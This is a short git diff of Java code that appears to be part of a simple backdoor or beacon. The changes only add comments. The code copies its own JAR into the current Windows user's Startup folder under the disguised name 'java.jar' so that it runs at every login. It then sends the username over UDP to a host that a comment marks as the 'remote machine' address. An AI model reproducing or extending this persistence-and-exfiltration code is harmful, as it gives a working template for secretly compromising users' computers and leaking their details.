@@ -11,7 +11,7 @@ public class Main {
     public static void main(String[] args) throws IOException, InterruptedException {
         byte[] receive = new byte[1024];
         byte[] buf;
-        InetAddress address = InetAddress.getByName("localhost");
+        InetAddress address = InetAddress.getByName("localhost");       //ip address of remote machine to send ip address goes here
         DatagramSocket socket = new DatagramSocket();
 
         String username = System.getProperty("user.name");
@@ -20,7 +20,7 @@ public class Main {
         String test = if_path.substring(0, if_path.lastIndexOf('\\'));
         test = test.substring(test.lastIndexOf('\\') + 1);
         if (!test.equals("Startup")) {
-            File finalPath = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\java.jar");
+            File finalPath = new File("C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\java.jar"); //mount to shell:startup of current user
             Files.copy(path.toPath(), finalPath.toPath(), StandardCopyOption.REPLACE_EXISTING);
         }
         buf = username.getBytes();
